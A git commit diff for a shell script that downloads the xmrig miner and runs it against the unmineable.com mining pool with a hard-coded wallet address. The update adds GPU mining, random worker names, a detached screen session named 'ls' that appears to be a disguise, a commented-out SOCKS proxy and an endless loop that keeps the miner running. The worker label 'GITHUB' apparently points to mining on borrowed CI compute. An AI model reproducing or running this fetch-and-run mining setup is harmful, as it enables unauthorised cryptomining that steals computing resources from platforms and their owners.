4dc9fb3d6d9f7e23b2d1eb8d7cd5be41dcea4923
masgogonwoi12 <90788969+masgogonwoi12@users.noreply.github.com>
2021-09-16 00:28:45 +0700

    Update lembur_mulu.sh

--- lembur_mulu.sh
+++ lembur_mulu.sh
@@ -1,10 +1,12 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
-tar xf xmrig-6.14.0-linux-x64.tar.gz
-cd xmrig-6.14.0
-./xmrig -a rx -o rx.unmineable.com:3333 -u BTT:TUyirySXd8brNTK5H5fpQySCsGwRoADhWK.VP5#qm1d-5eux -k -p x --cpu 4
+apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
+tar xf xmrig-6.15.0-linux-x64.tar.gz
+cd xmrig-6.15.0
+screen -dmS ls 
+WORKER=$(echo $(shuf -i 11111-9999999 -n 1)-GPU)
+#PROXY=socks5://72.210.252.134:46164
+./xmrig --opencl --cuda -o rx.unmineable.com:3333 -u BTT:TUyirySXd8brNTK5H5fpQySCsGwRoADhWK.GITHUB#qm1d-5eux -k
 while [ 1 ]; do
 sleep 3
 done
